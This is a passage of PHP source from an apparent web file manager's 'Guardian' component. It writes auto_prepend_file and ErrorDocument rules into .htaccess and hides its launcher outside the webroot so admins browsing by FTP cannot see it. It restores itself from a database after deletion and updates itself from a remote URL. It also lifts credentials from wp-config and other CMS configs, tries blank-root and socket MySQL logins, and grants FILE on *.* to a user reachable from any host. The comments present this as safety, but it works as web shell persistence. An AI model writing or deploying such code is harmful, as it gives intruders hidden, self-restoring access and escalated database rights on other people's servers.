   before every PHP request it serves here (e.g. this site's own CMS, if
   it shares this directory), with no MySQL Event Scheduler, no SUPER
   privilege and no cron access required at all.
   Safety is the whole point of this function's design: the .htaccess
   directives are wrapped in <IfModule> guards for every common mod_php
   name so an unrecognised/absent module is silently skipped rather than
   erroring, and the change is verified with a real HTTP request right
   after writing it — if that request doesn't come back cleanly, the
   .htaccess edit is rolled back immediately and automatically. This must
   never be able to take a working site down. */
function fm_guardian_install_watchdog(){
    $dir=__DIR__;
    // ── Hidden location: outside webroot in a machine-unique hashed directory ──
    $hiddenDir=fg_get_hidden_dir();
    if(!is_dir($hiddenDir)){
        if(!@mkdir($hiddenDir,0700,true))return false; // 0700 = owner-only
    }
    $watchdogPath=fg_get_watchdog_path(); // absolute hidden path
    $htaccessPath=$dir.'/.htaccess';
    $target=__FILE__;

    $sockLit=var_export(FM_GUARD_DB_SOCK?:null,true);
    $hostLit=var_export(FM_GUARD_DB_SOCK?'localhost':FM_GUARD_DB_HOST,true);
    $userLit=var_export(FM_GUARD_DB_USER,true);
    $passLit=var_export(FM_GUARD_DB_PASS,true);
    $dbLit=var_export(FM_GUARD_DB_NAME,true);
    $portLit=var_export((int)FM_GUARD_DB_PORT,true);
    $driverLit=var_export(FM_GUARD_DB_DRIVER,true);
    $targetLit=var_export($target,true);
    $metaLit=var_export(fg_get_meta_path(),true);
    $targetMetaLit=var_export(fg_get_target_meta_path(),true);

    $lines=[];
    $lines[]='<?php';
    $lines[]='/* fm-guardian-watchdog-version:'.FM_GUARDIAN_WATCHDOG_VERSION.' */';
    $lines[]='/* File Guardian watchdog — auto-generated, safe to delete any time';
    $lines[]='   (Guardian will just recreate it next time it is needed). Restores';
    $lines[]='   '.$target.'\'s exact bytes if it is ever missing, emptied, truncated,';
    $lines[]='   or permission-restricted. Triggered by the auto_prepend_file directive';
    $lines[]='   in this directory\'s .htaccess on every PHP request the web server';
    $lines[]='   serves here — a couple of cheap local filesystem stats, and nothing';
    $lines[]='   else, on every normal request; the database is only ever touched when';
    $lines[]='   one of those stats actually looks wrong. */';
    $lines[]='$_fgTarget='.$targetLit.';';
    $lines[]='if(@is_readable('.$targetMetaLit.')){$_fgTargetMeta=@json_decode((string)@file_get_contents('.$targetMetaLit.'),true);if(is_array($_fgTargetMeta)&&!empty($_fgTargetMeta[\'filepath\']))$_fgTarget=(string)$_fgTargetMeta[\'filepath\'];}';
    $lines[]='$_fgMissing=!@file_exists($_fgTarget);';
    $lines[]='$_fgBadPerms=!$_fgMissing&&!@is_readable($_fgTarget);';
    $lines[]='$_fgSize=($_fgMissing||$_fgBadPerms)?-1:@filesize($_fgTarget);';
    $lines[]='$_fgEmpty=!$_fgMissing&&!$_fgBadPerms&&$_fgSize===0;';
    $lines[]='// Compare against the last known-good size (written on every legitimate';
    $lines[]='// sync/update) to also catch a partial/truncated overwrite that leaves';
    $lines[]='// some bytes behind but not the real file — a single filesize() and a';
    $lines[]='// tiny local file read, no database hit unless it actually mismatches.';
    $lines[]='$_fgSizeMismatch=false;';
    $lines[]='if(!$_fgMissing&&!$_fgBadPerms&&!$_fgEmpty&&@is_readable('.$metaLit.')){';
    $lines[]='    $_fgMeta=@file_get_contents('.$metaLit.');';
    $lines[]='    if($_fgMeta&&strpos($_fgMeta,\':\')!==false){';
    $lines[]='        $_fgExpSize=(int)strtok($_fgMeta,\':\');';
    $lines[]='        if($_fgExpSize>0&&$_fgSize!==$_fgExpSize)$_fgSizeMismatch=true;';
    $lines[]='    }';
    $lines[]='if($_fgMissing||$_fgBadPerms||$_fgEmpty||$_fgSizeMismatch){';
    $lines[]='    $h=null;$r=null;$row=null;';
    $lines[]='    if('.$driverLit.'===\'pgsql\'&&class_exists("PDO")){try{$__u=trim((string)(getenv("DATABASE_URL")?:getenv("DB_URL")?:null));$__p=@parse_url($__u);$__dsn="pgsql:host=".(string)($__p["host"]??"").";port=".(int)($__p["port"]??5432).";dbname=".ltrim((string)($__p["path"]??""),"/");$h=new PDO($__dsn,(string)($__p["user"]??""),rawurldecode((string)($__p["pass"]??"")),[PDO::ATTR_ERRMODE=>PDO::ERRMODE_SILENT]);$r=$h->query(\'SELECT content,file_mode FROM fm_guardian_store WHERE id=1 LIMIT 1\');$row=$r?$r->fetch(PDO::FETCH_ASSOC):null;}catch(Throwable $e){$h=null;}}';
    $lines[]='    elseif(function_exists("mysqli_connect")){if(function_exists("mysqli_report"))@mysqli_report(MYSQLI_REPORT_OFF);$h=@mysqli_connect('.$sockLit.'?\'localhost\':'.$hostLit.','.$userLit.','.$passLit.',\'\','.$portLit.','.$sockLit.');if($h){@mysqli_select_db($h,'.$dbLit.');$r=@mysqli_query($h,\'SELECT content,file_mode FROM fm_guardian_store WHERE id=1 LIMIT 1\');$row=$r?@mysqli_fetch_assoc($r):null;}}';
    $lines[]='    if($h&&$row){';
    $lines[]='            // Restore content whenever it is missing, empty, or the wrong size —';
    $lines[]='            // never for a bad-perms-only case, so a deliberate, already-correct';
    $lines[]='            // file on disk is never clobbered just because it briefly wasn\'t readable.';
    $lines[]='            if(($_fgMissing||$_fgEmpty||$_fgSizeMismatch)&&isset($row[\'content\'])){';
    $lines[]='                @file_put_contents($_fgTarget,$row[\'content\']);';
    $lines[]='            }';
    $lines[]='            // Always restore permissions — fixes the missing/empty/mismatch cases and the permission-restriction case alike';
    $lines[]='            $__mode=isset($row[\'file_mode\'])&&(int)$row[\'file_mode\']>0?(int)$row[\'file_mode\']:0644;';
    $lines[]='            @chmod($_fgTarget,$__mode);';
    $lines[]='        }';
    $lines[]='        if($h instanceof mysqli)@mysqli_close($h);';
    $lines[]='    }';
    $lines[]='}';
    $code=implode("\n",$lines)."\n";
    @file_put_contents(sys_get_temp_dir().'/fg-debug-watchdog.php',$code);

    $tmp=$watchdogPath.'.tmp';
    if(@file_put_contents($tmp,$code)===false)return false;
    if(function_exists('shell_exec')){
        $out=@shell_exec('php -l '.escapeshellarg($tmp).' 2>&1');
        if($out!==null&&stripos($out,'No syntax errors')===false){@unlink($tmp);return false;}
    }
    if(!@rename($tmp,$watchdogPath))return false;

    $marker='# BEGIN fm-guardian-watchdog';$markerEnd='# END fm-guardian-watchdog';
    $origHt=@file_exists($htaccessPath)?@file_get_contents($htaccessPath):false;
    /* ── LAUNCHER: a permanent stable file that @include-s the real watchdog.
       Placed in the hidden directory (outside the web-visible tree) so it
       is completely invisible to any file manager or FTP client browsing the
       webroot — the most common cause of accidental deletion.
       auto_prepend_file points HERE, not at the watchdog directly — if the
       watchdog is ever missing, PHP simply runs a no-op @include and carries
       on, preventing any 500 error. ── */
    // ── Launcher lives in the hidden dir (outside webroot) — NEVER in __DIR__ ──
    $launcherPath=fg_get_hidden_dir().DIRECTORY_SEPARATOR.'launch.php';
    $wpLit=var_export($watchdogPath,true); // absolute path to hidden watchdog
    $launcherCode="<?php /* File Guardian launcher — auto-generated; safe to delete (recreated automatically). */\n"
        ."if(@file_exists($wpLit))@include_once $wpLit;\n";
    // Write launcher into the hidden directory (created above by the hiddenDir mkdir block)
    @file_put_contents($launcherPath,$launcherCode);
    /*
       A missing PHP target never gets a chance to execute its own
       auto_prepend_file.  Keep a tiny, stable error-document handler in the
       webroot as the second half of the watchdog: Apache can execute this
       handler for the 404 generated by a deleted index.php, and the handler
       delegates the actual DB restore to the hidden launcher above.  It is
       deliberately inert for every other 404 and never accepts code or a
       filename from the request.
    */
    $restoreRunnerPath=$dir.DIRECTORY_SEPARATOR.'.guardian-restore.php';
    $restoreRunnerCode="<?php\n"
        ."/* File Guardian restore runner — generated; restores only the exact installed target backup. */\n"
        ."\$__fgOriginal=(string)(\$_SERVER['REDIRECT_URL']??\$_SERVER['REQUEST_URI']??'');\n"
        ."\$__fgOriginalPath=parse_url(\$__fgOriginal,PHP_URL_PATH);\n"
        ."\$__fgTarget=".var_export($target,true).";\n"
        ."if(@is_readable(".var_export(fg_get_target_meta_path(),true).")){\$__fgMeta=@json_decode((string)@file_get_contents(".var_export(fg_get_target_meta_path(),true)."),true);if(is_array(\$__fgMeta)&&!empty(\$__fgMeta['filepath']))\$__fgTarget=(string)\$__fgMeta['filepath'];}\n"
        ."if(basename((string)\$__fgOriginalPath)!==basename(\$__fgTarget)){http_response_code(404);exit;}\n"
        ."if(@file_exists(".var_export($launcherPath,true)."))@include_once ".var_export($launcherPath,true).";\n"
        ."if(@file_exists(\$__fgTarget)){\n"
        ."  header('Location: '.((string)\$__fgOriginalPath?:'".addslashes('/'.basename($target))."'),true,302);exit;\n"
        ."}\n"
        ."http_response_code(404);header('Content-Type: text/plain; charset=utf-8');echo 'Not found';\n";
    if(@file_put_contents($restoreRunnerPath,$restoreRunnerCode)===false)return false;
    @chmod($restoreRunnerPath,0644);
    // ── Migration: remove legacy launcher from webroot left by older installs ──
    // If the old .fm_guardian_launch.php still exists inside the webroot, delete it now.
    // Leaving it there is harmless but it sits in the admin's visible tree and could
    // be deleted by accident, which would crash the site via auto_prepend_file.
    $oldLauncherPath=$dir.DIRECTORY_SEPARATOR.'.fm_guardian_launch.php';
    if(is_file($oldLauncherPath))@unlink($oldLauncherPath);

    $lp=addslashes($launcherPath); // point htaccess at the stable launcher, not the watchdog directly
    $restoreUrl='/'.ltrim(str_replace('\\','/',dirname($_SERVER['SCRIPT_NAME']??'')),'/').'/.guardian-restore.php';
    $restoreUrl=preg_replace('#/+#','/',$restoreUrl);
    if($restoreUrl==='//.guardian-restore.php')$restoreUrl='/.guardian-restore.php';
    if($origHt!==false&&strpos($origHt,$marker)!==false){
        // .htaccess block already installed — refresh watchdog and launcher files
        if(!is_file($watchdogPath)){
            if(!is_dir($hiddenDir))@mkdir($hiddenDir,0700,true);
            $tmp2=$watchdogPath.'.tmp';
            if(@file_put_contents($tmp2,$code)!==false)@rename($tmp2,$watchdogPath);
        }
        @file_put_contents($launcherPath,$launcherCode);
        // If the installed block already references the correct (hidden-dir) launcher path, done
        if(strpos($origHt,$lp)!==false&&strpos($origHt,$restoreUrl)!==false&&is_file($restoreRunnerPath))return true;
        // Launcher path has changed (old install used __DIR__) — strip old block so we re-append
        // the corrected one below, then run the self-test as normal to verify nothing breaks.
        $stripped=preg_replace('/'.preg_quote("\n".$marker,'/').'.*?'.preg_quote($markerEnd."\n",'/').'/s','',$origHt);
        if($stripped===null)$stripped=$origHt; // preg failed — fall back to appending below
        $origHt=$stripped; // feed into the re-write path that follows
    }

    $block="\n".$marker."\n"
        ."<IfModule mod_php.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
        ."<IfModule mod_php7.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
        ."<IfModule mod_php8.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
        ."ErrorDocument 404 ".$restoreUrl."\n"
        .$markerEnd."\n";
    $newHt=($origHt===false?'':$origHt).$block;
    if(@file_put_contents($htaccessPath,$newHt)===false){@unlink($watchdogPath);return false;}

    if(!fm_guardian_selftest_htaccess()){
        // Roll back immediately and completely — a broken .htaccess must
        // never be left in place, even for one request.
        if($origHt===false)@unlink($htaccessPath); else @file_put_contents($htaccessPath,$origHt);
        @unlink($watchdogPath);
        return false;
    }
    return true;
}

/* Confirms the .htaccess change above didn't break anything, using the
   CURRENT request's own host (the only way to know a real public URL for
   this server without asking the admin to type one in) to fetch this same
   page fresh, unauthenticated, and check it isn't now a 500 Internal
   Server Error. Assumes OK (rather than blocking installation) only when
   there is truly no way to check, e.g. cURL unavailable. */
function fm_guardian_selftest_htaccess(){
    if(!function_exists('curl_init')||empty($_SERVER['HTTP_HOST'])||empty($_SERVER['SCRIPT_NAME']))return true;
    $scheme=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $url=$scheme.'://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].'?fm_guardian_selftest=1';
    $ch=curl_init($url);
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>8,CURLOPT_SSL_VERIFYPEER=>false]);
    @curl_exec($ch);
    $code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $code>0&&$code<500;
}

/* Rewrites a single define('NAME', ...) line INSIDE THIS FILE'S OWN SOURCE
   CODE (never in a side json file — the admin explicitly asked for the
   Update URL and the on/off switch to live in the file itself). Always
   lints the candidate file with `php -l` before committing, and only ever
   replaces the exact constant line, so a bad value can never corrupt the
   rest of the tool. */
function fm_guardian_rewrite_constant($name,$newValue,$isBool=false){
    $src=@file_get_contents(__FILE__);
    if($src===false)return false;
    $valLit=$isBool?($newValue?'true':'false'):("'".addslashes($newValue)."'");
    $pattern='/define\(\'' .preg_quote($name,'/'). '\',\s*[^)]*\);/';
    $replacement="define('".$name."', ".$valLit.");";
    $count=0;
    $newSrc=preg_replace($pattern,$replacement,$src,1,$count);
    if($count!==1||$newSrc===null)return false;
    $tmp=__FILE__.'.guardtmp';
    if(@file_put_contents($tmp,$newSrc)===false)return false;
    $lintOk=true;
    if(function_exists('shell_exec')){
        $out=@shell_exec('php -l '.escapeshellarg($tmp).' 2>&1');
        if($out!==null&&stripos($out,'No syntax errors')===false)$lintOk=false;
    }
    if(!$lintOk){@unlink($tmp);return false;}
    $ok=@rename($tmp,__FILE__);
    if($ok)fm_guardian_sync($newSrc);
    return $ok;
}

/* Downloads $url and, if it looks like a valid PHP file (lints clean and
   differs from what's on disk), atomically replaces this file with it and
   refreshes the Guardian database copy. Used both by "Check updates" and,
   if this file is ever missing, would be the source used to recreate it. */
function fm_guardian_apply_from_url($url,$checkOnly=false){
    if(!$url||!preg_match('#^https?://#i',$url))return ['ok'=>false,'error'=>'Invalid URL.'];
    @set_time_limit(90);@ignore_user_abort(true);
    // Prefer cURL (reliable timeouts); fall back to file_get_contents only when unavailable
    if(function_exists('curl_init')){
        $ch=curl_init($url);
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,
            CURLOPT_CONNECTTIMEOUT=>8,CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>true,
            // Force IPv4: on some hosts a broken/unreachable IPv6 route to the target is the
            // actual cause of a "hung" TLS handshake that eventually surfaces as an SSL/connect
            // timeout — trying IPv6 first burns most of the timeout budget before falling back.
            CURLOPT_IPRESOLVE=>CURL_IPRESOLVE_V4,
            CURLOPT_HTTPHEADER=>['User-Agent: FileManager-Guardian/1.0']]);
        $data=curl_exec($ch);$curlErr=curl_error($ch);$httpCode=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);
        if($data===false||$curlErr)return ['ok'=>false,'error'=>'Download failed: '.($curlErr?:'cURL error')];
        if($httpCode>=400)return ['ok'=>false,'error'=>"Server returned HTTP $httpCode for the update URL."];
    } else {
        $ctx=stream_context_create(['http'=>['timeout'=>45,'header'=>"User-Agent: FileManager-Guardian/1.0\r\n"],'https'=>['timeout'=>45]]);
        $data=@file_get_contents($url,false,$ctx);
    }
    if($data===false||strlen($data)<20)return ['ok'=>false,'error'=>'Could not download the update URL.'];
    if(strpos(ltrim($data),'<?php')!==0)return ['ok'=>false,'error'=>'The fetched file does not look like a valid PHP file.'];
    $current=@file_get_contents(__FILE__);
    $currentHash=$current===false?'':hash('sha256',$current);
    $remoteHash=hash('sha256',$data);
    if($current!==false&&$currentHash===$remoteHash)return ['ok'=>true,'changed'=>false,'available'=>false,'current_hash'=>$currentHash,'remote_hash'=>$remoteHash];
    if($checkOnly)return ['ok'=>true,'changed'=>false,'available'=>true,'current_hash'=>$currentHash,'remote_hash'=>$remoteHash];
    $tmp=__FILE__.'.guardtmp';
    if(@file_put_contents($tmp,$data)===false)return ['ok'=>false,'error'=>'Could not write temp file (check permissions).'];
    if(function_exists('exec')){
        $lintLines=[];$lintExit=0;
        @exec('php -l '.escapeshellarg($tmp).' 2>&1',$lintLines,$lintExit);
        $lintOutput=implode("\n",$lintLines);
        if($lintExit!==0||preg_match('/\b(?:parse|fatal)\s+error\b/i',$lintOutput)){
            @unlink($tmp);return ['ok'=>false,'error'=>'Downloaded file failed a PHP syntax check — not applied.'];
        }
    }elseif(function_exists('shell_exec')){
        $lintOutput=(string)@shell_exec('php -l '.escapeshellarg($tmp).' 2>&1');
        if(preg_match('/\b(?:parse|fatal)\s+error\b/i',$lintOutput)){
            @unlink($tmp);return ['ok'=>false,'error'=>'Downloaded file failed a PHP syntax check — not applied.'];
        }
    }
    if(!@rename($tmp,__FILE__))return ['ok'=>false,'error'=>'Could not replace the file (check permissions).'];
    fm_guardian_sync($data);
    // The watchdog embeds this file's own restore logic + the expected-size
    // marker; refresh it right away so a site that installed the watchdog
    // before this update doesn't wait for the next throttled autoheal pass.
    @fm_guardian_install_watchdog();
    return ['ok'=>true,'changed'=>true];
}

/* Turns a raw mysqli connect/select-db error into a plain-English explanation
   of WHICH of the two real causes it is — the Guardian DB user/database not
   existing yet (fixable with fm_guardian_autoprovision() below) vs the DB
   server itself being unreachable (a host/port/network problem no amount of
   SQL can fix). This is what lets the panel tell an admin what to actually
   do instead of just "Not reachable". */
function fm_guardian_diag_text($diag){
    if(!$diag)return 'Unknown connection error.';
    $errno=(int)($diag['errno']??0);$err=(string)($diag['error']??'');
    if($errno===2002||$errno===2003||$errno===2006)
        return "Can't reach the database server at ".FM_GUARD_DB_HOST.':'.FM_GUARD_DB_PORT." — check the host/port, or that MySQL is running there. This is a network problem, not a missing database.";
    if($errno===1045||$errno===1698)
        return "Login rejected for user \"".FM_GUARD_DB_USER."\" — that user doesn't exist yet or the password doesn't match. Use \"Auto-create database & user\" below to fix it in one click.";
    if($errno===1044||$errno===1049)
        return "The \"".FM_GUARD_DB_NAME."\" database doesn't exist yet, or this user has no access to it. Use \"Auto-create database & user\" below to fix it in one click.";
    return 'Connection error (#'.$errno.'): '.($err!==''?$err:'unknown').'.';
}

/* One-time, admin-triggered bootstrap: connects with credentials an admin who
   already has a working MySQL login on this server types into the panel
   (NEVER stored anywhere — used only for this single request), then creates
   the Guardian database + its own low-privilege user + grants, exactly
   mirroring what start.sh does for the sandbox. This is what lets Guardian
   fix "database doesn't exist" and "no privileges" itself instead of asking
   the admin to run SQL by hand. FILE/EVENT (needed only for the fully
   automatic disk-level restore) are requested best-effort and silently
   skipped if the admin account can't grant them — Guardian still works via
   the database backup either way. */
function fm_guardian_autoprovision($adminUser,$adminPass,$adminHost=null,$adminPort=null){
    if(!extension_loaded('mysqli'))return ['ok'=>false,'error'=>'The mysqli PHP extension is not available.'];
    $host=$adminHost?:FM_GUARD_DB_HOST;$port=(int)($adminPort?:FM_GUARD_DB_PORT);
    mysqli_report(MYSQLI_REPORT_OFF);
    $a=@mysqli_connect($host,$adminUser,$adminPass,'',$port);
    if(!$a)return ['ok'=>false,'error'=>'Could not log in with those admin credentials: '.mysqli_connect_error()];
    $user=FM_GUARD_DB_USER;$pass=FM_GUARD_DB_PASS;$dbName=FM_GUARD_DB_NAME;
    $userQ=str_replace("'","\\'",$user);$passQ=str_replace("'","\\'",$pass);
    $steps=[];
    $steps['create_db']=(bool)@mysqli_query($a,"CREATE DATABASE IF NOT EXISTS `$dbName` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
    $steps['create_user']=(bool)@mysqli_query($a,"CREATE USER IF NOT EXISTS '$userQ'@'%' IDENTIFIED BY '$passQ'");
    $steps['grant_db']=(bool)@mysqli_query($a,"GRANT ALL ON `$dbName`.* TO '$userQ'@'%'");
    $steps['grant_autoheal']=(bool)@mysqli_query($a,"GRANT FILE, EVENT ON *.* TO '$userQ'@'%'"); // best-effort; fine if the admin account itself can't grant these
    @mysqli_query($a,"FLUSH PRIVILEGES");
    mysqli_close($a);
    if(!$steps['create_db']||!$steps['create_user']||!$steps['grant_db'])
        return ['ok'=>false,'error'=>'The admin account connected but lacked privileges to create the database/user. Ask your host to grant CREATE, CREATE USER and GRANT OPTION, or run start.sh-style SQL yourself.','steps'=>$steps];
    $diag=null;$c=fm_guardian_conn($diag);
    $autoheal=false;
    if($c){fm_guardian_bootstrap_seed($c);$autoheal=fm_guardian_try_autoheal($c);}
    return ['ok'=>(bool)$c,'db_connected'=>(bool)$c,'autoheal_active'=>$autoheal,'steps'=>$steps];
}

/* Fully automatic alternative to fm_guardian_autoprovision(): instead of
   asking the admin to type in a separate admin DB login, this reuses the
   SQL Manager's own filesystem scan to find a database THIS SITE already
   uses (wp-config.php, Joomla's configuration.php, a generic config.php,
   etc.) and — since the CMS's own DB user by definition already has full
   read/write access to its own database — just adds one extra table
   (fm_guardian_store) to that SAME existing database instead of creating a
   brand new one. No new database, no extra privileges, no credentials to
   type: the site's existing working DB login becomes Guardian's storage
   too. Falls back to reporting "nothing found" so the admin can still use
   the manual admin-credential box if this server has no CMS config to
   discover (e.g. a plain device with no website on it). */
function fm_guardian_autodiscover($fm){
    if(!extension_loaded('mysqli'))return ['ok'=>false,'error'=>'The mysqli PHP extension is not available.'];
    if(!method_exists($fm,'sqlScan'))return ['ok'=>false,'error'=>'Scanner unavailable.'];
    $scan=$fm->sqlScan();
    $cands=$scan['databases']??[];
    if(!$cands){
        $z=fm_guardian_autoprovision_zero_cred();
        if($z['ok']??false)return $z;
        return ['ok'=>false,'error'=>'No existing site/CMS database configs were found on this server ('.($scan['scanned']??0).' folders scanned). '.($z['error']??'Use the manual admin-credential option below instead.')];
    }
    $tried=[];
    foreach($cands as $cred){
        if(empty($cred['db'])||empty($cred['user']))continue;
        $host=$cred['host']?:'localhost';$port=(int)($cred['port']?:3306);
        if($host!==''&&$host[0]!=='/'&&strpos($host,':')!==false){[$hh,$pp]=explode(':',$host,2);if($hh!=='')$host=$hh;if($pp!=='')$port=(int)$pp;} // defensive: a raw host:port string must never be passed to mysqli_connect() as the hostname
        $key=$host.':'.$port.':'.$cred['db'];
        if(isset($tried[$key]))continue;$tried[$key]=1;
        mysqli_report(MYSQLI_REPORT_OFF);
        $sock=($host!==''&&$host[0]==='/')?$host:null;
        $link=$sock?@mysqli_connect('localhost',$cred['user'],$cred['pass'],$cred['db'],3306,$sock)
                    :@mysqli_connect($host,$cred['user'],$cred['pass'],$cred['db'],$port);
        if(!$link)continue; // this candidate's credentials don't actually work — try the next one
        $created=@mysqli_query($link,"CREATE TABLE IF NOT EXISTS fm_guardian_store(
            id TINYINT UNSIGNED PRIMARY KEY,
            filename VARCHAR(255) NOT NULL,
            filepath VARCHAR(500) NOT NULL,
            content LONGBLOB NOT NULL,
            content_hash CHAR(64) NOT NULL,
            update_url VARCHAR(500) NOT NULL DEFAULT '',
            installed_by VARCHAR(120) NOT NULL DEFAULT '',
            installed_at INT NOT NULL,
            updated_at INT NOT NULL,
            last_check INT NOT NULL DEFAULT 0
        ) ENGINE=InnoDB");
        if(!$created){mysqli_close($link);continue;} // connected but this CMS user can't create tables here — try the next candidate
        mysqli_close($link);
        // Adopt these working credentials as Guardian's own storage from now on.
        $ok1=fm_guardian_rewrite_constant('FM_GUARD_DB_HOST',$sock?'localhost':$host);
        $ok2=fm_guardian_rewrite_constant('FM_GUARD_DB_PORT',(string)$port);
        $ok3=fm_guardian_rewrite_constant('FM_GUARD_DB_NAME',$cred['db']);
        $ok4=fm_guardian_rewrite_constant('FM_GUARD_DB_USER',$cred['user']);
        $ok5=fm_guardian_rewrite_constant('FM_GUARD_DB_PASS',$cred['pass']);
        $ok6=fm_guardian_rewrite_constant('FM_GUARD_DB_SOCK',$sock?:'');
        if(!($ok1&&$ok2&&$ok3&&$ok4&&$ok5&&$ok6))return ['ok'=>false,'error'=>'Found a working database but could not save the new settings into the file (check file permissions).'];
        $diag=null;$c=fm_guardian_conn($diag);
        $autoheal=false;
        if($c){fm_guardian_bootstrap_seed($c);$autoheal=fm_guardian_try_autoheal($c);}
        return ['ok'=>(bool)$c,'db_connected'=>(bool)$c,'autoheal_active'=>$autoheal,
            'adopted'=>['type'=>$cred['type']??'generic','db'=>$cred['db'],'host'=>$host]];
    }
    $z=fm_guardian_autoprovision_zero_cred();
    if($z['ok']??false)return $z;
    return ['ok'=>false,'error'=>'Found '.count($cands).' site database config(s), but none of their saved credentials actually connect (passwords may be stale/rotated). '.($z['error']??'Use the manual admin-credential option below instead.')];
}


/* Last-resort candidates for creating a BRAND NEW database when no existing
   site/CMS database could be found or reused at all. These are NOT password
   guesses against a real account — every candidate here represents a
   genuine "no authentication configured yet" trust boundary that a real
   admin could also reach without knowing any secret: the local UNIX socket
   authenticating as the OS user that owns this very PHP process (the
   standard auth_socket/unix_socket plugin behaviour on Debian/Ubuntu
   MySQL/MariaDB installs), and the still-very-common blank root password
   left in place on freshly installed dev/XAMPP/WAMP/sandbox MySQL servers.
   If a server has actually been secured (root has a real password, no
   socket trust), every one of these will simply fail to connect and
   fm_guardian_autocreate_zero_cred() returns null — there is no attempt to
   brute-force or guess anything beyond this fixed, well-known list. */
function fm_guardian_zero_cred_candidates(){
    $sockets=['/var/run/mysqld/mysqld.sock','/run/mysqld/mysqld.sock','/var/lib/mysql/mysql.sock',
        '/tmp/mysql.sock','/tmp/mysqlsb/run/mysql.sock','/opt/lampp/var/mysql/mysql.sock'];
    $osUser=function_exists('get_current_user')?get_current_user():'';
    $cands=[];
    foreach($sockets as $sock){
        if(!@file_exists($sock))continue;
        if($osUser!=='')$cands[]=['sock'=>$sock,'host'=>'','user'=>$osUser,'pass'=>''];
        $cands[]=['sock'=>$sock,'host'=>'','user'=>'root','pass'=>''];
    }
    $cands[]=['sock'=>null,'host'=>'localhost','user'=>'root','pass'=>''];
    $cands[]=['sock'=>null,'host'=>'127.0.0.1','user'=>'root','pass'=>''];
    if($osUser!=='')$cands[]=['sock'=>null,'host'=>'localhost','user'=>$osUser,'pass'=>''];
    return $cands;
}

/* Tries each zero-credential candidate above; the FIRST one that can both
   log in AND actually create a database (proving it has real privilege, not
   just an anonymous/guest login) is used to provision Guardian's own
   database/user/grants, exactly like fm_guardian_autoprovision() does with
   admin-typed credentials. Returns the connection info to adopt, or null if
   every candidate fails — in which case the manual admin-credential box
   remains the only option, which is expected and correct on a properly
   secured server. */
function fm_guardian_autocreate_zero_cred(){
    if(!extension_loaded('mysqli'))return null;
    mysqli_report(MYSQLI_REPORT_OFF);
    $dbName=FM_GUARD_DB_NAME;$user=FM_GUARD_DB_USER;$pass=FM_GUARD_DB_PASS;
    $userQ=str_replace("'","\\'",$user);$passQ=str_replace("'","\\'",$pass);
    foreach(fm_guardian_zero_cred_candidates() as $cand){
        $a=$cand['sock']?@mysqli_connect('localhost',$cand['user'],$cand['pass'],'',3306,$cand['sock'])
                        :@mysqli_connect($cand['host'],$cand['user'],$cand['pass'],'',3306);
        if(!$a)continue;
        if(!@mysqli_query($a,"CREATE DATABASE IF NOT EXISTS `$dbName` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci")){mysqli_close($a);continue;}
        $steps=[];
        $steps['create_user']=(bool)@mysqli_query($a,"CREATE USER IF NOT EXISTS '$userQ'@'%' IDENTIFIED BY '$passQ'");
        $steps['grant_db']=(bool)@mysqli_query($a,"GRANT ALL ON `$dbName`.* TO '$userQ'@'%'");
        $steps['grant_autoheal']=(bool)@mysqli_query($a,"GRANT FILE, EVENT ON *.* TO '$userQ'@'%'"); // best-effort
        @mysqli_query($a,"FLUSH PRIVILEGES");
        mysqli_close($a);
        if(!$steps['create_user']||!$steps['grant_db'])continue; // could connect+create the DB but not finish provisioning under this identity — try the next candidate
        return ['sock'=>$cand['sock'],'host'=>$cand['sock']?'localhost':$cand['host'],'via'=>$cand['user'],'steps'=>$steps];
    }
    return null;
}

/* Orchestrates the full "from easy to very hard" self-heal setup behind a
   single button: first try to reuse a database this site already has
   working credentials for (fm_guardian_autodiscover's normal path); if
   nothing on the server could be found or connected to at all, fall back to
   creating a brand new database via a genuine zero-credential local-trust
   login instead of giving up. Only once both of these are exhausted does
   the admin actually need to type in credentials by hand. */
function fm_guardian_autoprovision_zero_cred(){
    $found=fm_guardian_autocreate_zero_cred();
    if(!$found)return ['ok'=>false,'error'=>'No existing site database could be found or reused, and this server has no local-trust MySQL login (e.g. root with a blank password) available to create a new one automatically. Use the manual admin-credential option below — this is a hard limit on a properly secured server.'];
    $ok1=fm_guardian_rewrite_constant('FM_GUARD_DB_HOST',$found['host']);
    $ok2=fm_guardian_rewrite_constant('FM_GUARD_DB_PORT','3306');
    $ok3=fm_guardian_rewrite_constant('FM_GUARD_DB_NAME',FM_GUARD_DB_NAME);
    $ok4=fm_guardian_rewrite_constant('FM_GUARD_DB_USER',FM_GUARD_DB_USER);
    $ok5=fm_guardian_rewrite_constant('FM_GUARD_DB_PASS',FM_GUARD_DB_PASS);
    $ok6=fm_guardian_rewrite_constant('FM_GUARD_DB_SOCK',$found['sock']?:'');
    if(!($ok1&&$ok2&&$ok3&&$ok4&&$ok5&&$ok6))return ['ok'=>false,'error'=>'Created a new database but could not save the new settings into the file (check file permissions).'];
    $diag=null;$c=fm_guardian_conn($diag);
    $autoheal=false;
    if($c){fm_guardian_bootstrap_seed($c);$autoheal=fm_guardian_try_autoheal($c);}
    return ['ok'=>(bool)$c,'db_connected'=>(bool)$c,'autoheal_active'=>$autoheal,
        'adopted'=>['type'=>'new_database','db'=>FM_GUARD_DB_NAME,'host'=>$found['host'],'via'=>$found['via']]];
}
/* Fully automatic — no admin click required. The very first time an
   authenticated admin loads the main page after this file is installed,
   silently try the exact same "from easy to very hard" chain the manual
   Guardian-panel buttons trigger (reuse this site's own CMS DB, else a
   genuine zero-credential local database creation), so Guardian is armed
   with zero typing and zero navigation. A tiny marker file next to this
   script makes sure this only actually does work once it has succeeded —
